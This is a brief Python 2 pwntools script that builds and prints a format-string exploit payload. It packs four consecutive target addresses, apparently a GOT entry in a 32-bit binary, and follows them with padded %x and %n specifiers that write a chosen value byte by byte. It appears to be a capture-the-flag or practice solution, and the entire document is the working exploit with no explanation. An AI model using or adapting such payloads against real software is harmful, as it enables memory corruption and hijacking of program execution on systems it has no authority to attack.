#!/usr/bin/python

import sys
import struct
from pwn import *

payload = "A"+ p32(0x804a01c) + 'BBBB'+p32(0x804a01d) +'BBBB' + p32(0x804a01e) +'BBBB' +p32(0x804a01f) +    "%119x%87x.%08x.%08x.%08x.%n%127d%n%126d%n%260d%n" 
print payload
